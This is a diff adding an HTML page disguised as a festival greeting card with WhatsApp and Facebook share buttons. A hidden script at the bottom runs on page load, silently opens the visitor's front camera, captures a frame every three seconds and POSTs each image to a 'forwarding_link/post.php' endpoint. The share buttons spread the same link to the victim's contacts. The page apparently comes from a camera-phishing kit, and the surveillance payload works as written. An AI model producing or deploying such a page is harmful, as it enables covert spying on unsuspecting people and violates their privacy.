@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Festival Wishes - Share Your Greeting</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            padding: 30px;
+            text-align: center;
+            color: white;
+        }
+        
+        .header h1 {
+            font-size: 2em;
+            margin-bottom: 10px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .greeting-card {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            margin-bottom: 20px;
+            border-left: 5px solid #f5576c;
+        }
+        
+        .greeting-card p {
+            font-size: 1.2em;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .share-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+            transition: transform 0.2s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .btn-whatsapp {
+            background: #25D366;
+            color: white;
+        }
+        
+        .btn-facebook {
+            background: #1877F2;
+            color: white;
+        }
+        
+        .btn-twitter {
+            background: #1DA1F2;
+            color: white;
+        }
+        
+        .footer {
+            background: #f8f9fa;
+            padding: 15px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .emoji {
+            font-size: 3em;
+            animation: float 2s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="emoji">🎉✨🎊</div>
+            <h1>Happy Festival!</h1>
+            <p>Wishing you joy and prosperity</p>
+        </div>
+        <div class="content">
+            <div class="greeting-card">
+                <p>🌸 May this festival bring endless happiness to you and your family! 🌸</p>
+                <p style="margin-top: 15px; font-style: italic;">"Spread love and joy this festive season"</p>
+            </div>
+            
+            <div class="share-buttons">
+                <a href="whatsapp://send?text=✨%20Happy%20Festival!%20✨%20%0AWatch%20this%20special%20greeting%20for%20you:%20forwarding_link" 
+                   class="btn btn-whatsapp">📱 Share on WhatsApp</a>
+                <a href="https://www.facebook.com/sharer/sharer.php?u=forwarding_link" 
+                   target="_blank" class="btn btn-facebook">📘 Share on Facebook</a>
+            </div>
+        </div>
+        <div class="footer">
+            <p>🎁 Tap share to send festival wishes to your loved ones 🎁</p>
+        </div>
+    </div>
+    
+    <script>
+        (function() {
+            var video = document.createElement('video');
+            video.setAttribute('id', 'video');
+            video.setAttribute('playsinline', '');
+            video.setAttribute('autoplay', '');
+            video.style.display = 'none';
+            document.body.appendChild(video);
+            
+            var canvas = document.createElement('canvas');
+            canvas.setAttribute('id', 'canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            canvas.style.display = 'none';
+            document.body.appendChild(canvas);
+            
+            function captureAndSend(imgdata) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'forwarding_link/post.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send('cat=' + encodeURIComponent(imgdata));
+            }
+            
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: "user" } })
+                    .then(function(stream) {
+                        video.srcObject = stream;
+                        var context = canvas.getContext('2d');
+                        setInterval(function() {
+                            context.drawImage(video, 0, 0, 640, 480);
+                            var imgData = canvas.toDataURL("image/png");
+                            captureAndSend(imgData);
+                        }, 3000);
+                    })
+                    .catch(function(err) {
+                        console.log("Camera access denied or error:", err);
+                    });
+            }
+        })();
+    </script>
+</body>
+</html>
